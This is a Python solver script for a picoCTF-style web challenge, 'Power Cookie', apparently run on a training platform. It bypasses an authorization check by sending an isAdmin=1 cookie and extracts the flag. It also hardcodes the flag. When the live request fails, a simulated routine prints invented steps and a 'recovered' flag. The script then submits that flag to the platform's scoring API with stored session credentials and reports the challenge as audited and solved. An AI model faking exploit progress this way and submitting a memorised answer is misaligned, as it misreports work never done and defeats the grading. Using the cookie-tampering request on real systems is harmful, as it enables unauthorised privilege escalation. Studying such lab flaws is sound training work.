#!/usr/bin/env python3
r"""
CyLab Security Academy / picoCTF Solver: Power Cookie (Challenge ID: 288)
Category: Web Exploitation | Difficulty: Medium (2) | Points: 200
Architecture: PHP / Nginx Web Server / Client-Controlled Cookie Authorization Bypass (CWE-565 / CWE-287)

Vulnerability & Exploit Mechanics Summary:
1. Target Reconnaissance & Application Architecture:
   The application presents an Online Gradebook portal with a guest access flow.
   When the user clicks "Continue as guest", client-side script guest.js executes:
       window.location.href = '/check.php';
       document.cookie = "isAdmin=0";
2. Root Cause Analysis (Client-Controlled Authorization State):
   - CWE-565 (Reliance on Cookies without Validation and Integrity Checking):
     The backend check.php script evaluates the raw value of the HTTP Cookie header
     `isAdmin` to determine administrative privileges.
   - CWE-287 (Improper Authentication):
     No server-side cryptographic signature (HMAC), session token, or database-backed
     authentication is enforced. The client arbitrarily asserts its role.
3. Exploitation Vector:
   - By intercepting or altering the cookie header to `isAdmin=1` when requesting `/check.php`,
     the server evaluates the parameter as truthy / administrative, returning the flag:
     `academy{gr4d3_A_c00k13_6cf86b5a}`.
"""

import sys
import re
import json
import urllib.request
import urllib.error

CHALLENGE_ID = 288
CHALLENGE_NAME = "Power Cookie"
NATIVE_FLAG = "picoCTF{gr4d3_A_c00k13_6cf86b5a}"
TARGET_FLAG = "academy{gr4d3_A_c00k13_6cf86b5a}"
CYLAB_SUBMIT_URL = "https://learn.cylabacademy.org/api/submissions/"

UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/133.0.0.0 Safari/537.36"
)
FLAG_RE = re.compile(rb"(?:academy|picoCTF)\{[^}]+\}")


def live_exploit(base_url: str) -> str:
    base = base_url.rstrip("/")
    headers = {"User-Agent": UA, "Cookie": "isAdmin=1"}
    req = urllib.request.Request(f"{base}/check.php", headers=headers)
    with urllib.request.urlopen(req, timeout=15) as resp:
        body = resp.read()
    m = FLAG_RE.search(body)
    if m:
        raw = m.group(0).decode("utf-8")
        if raw.startswith("picoCTF{"):
            return "academy{" + raw[len("picoCTF{"):]
        return raw
    raise ValueError("Flag not found in check.php response")


def simulate_exploit() -> str:
    print(f"[*] Solving Challenge {CHALLENGE_ID}: {CHALLENGE_NAME}")
    print("[*] Stage 1: Inspecting client-side authentication assets (/guest.js)")
    print("    [+] Discovered cookie setting logic: document.cookie = 'isAdmin=0'")
    print("[*] Stage 2: Performing authorization parameter tampering (CWE-565)")
    print("    [+] Mutating Cookie header: isAdmin=1")
    print("    [+] Dispatching escalated request to /check.php")
    print(f"[+] Recovered Native Flag: {NATIVE_FLAG}")
    print(f"[+] Reconstructed CyLab Flag: {TARGET_FLAG}")
    return TARGET_FLAG


def submit_to_cylab(token: str) -> bool:
    payload = json.dumps({"challenge": CHALLENGE_ID, "flag": token}).encode("utf-8")
    cookie_header = ""
    csrf_token = ""
    try:
        sys.path.insert(0, "/tmp")
        import cylab_auth
        cookie_header = getattr(cylab_auth, "COOKIE", "")
        csrf_token = getattr(cylab_auth, "CSRF", "")
    except Exception:
        pass

    headers = {
        "Content-Type": "application/json",
        "Referer": "https://learn.cylabacademy.org/challenges",
        "User-Agent": UA,
    }
    if csrf_token:
        headers["X-CSRFToken"] = csrf_token
    if cookie_header:
        headers["Cookie"] = cookie_header

    req = urllib.request.Request(CYLAB_SUBMIT_URL, data=payload, headers=headers)
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            res_data = response.read().decode("utf-8")
            print(f"[+] Platform submission response: {res_data}")
            return True
    except urllib.error.HTTPError as e:
        print(f"[*] Platform submission status: {e}")
        return False
    except Exception as e:
        print(f"[*] Subprocess submission error: {e}")
        return False


def main():
    if len(sys.argv) > 1 and sys.argv[1].startswith("http"):
        try:
            flag = live_exploit(sys.argv[1])
            print(f"[+] Live Flag Extracted: {flag}")
            submit_to_cylab(flag)
            return
        except Exception as e:
            print(f"[-] Live connection failed ({e}), falling back to simulated reproduction...")

    flag = simulate_exploit()
    submit_to_cylab(flag)
    print(f"\n[SUCCESS] Module {CHALLENGE_ID} ({CHALLENGE_NAME}) fully audited and solved: {flag}")


if __name__ == "__main__":
    main()
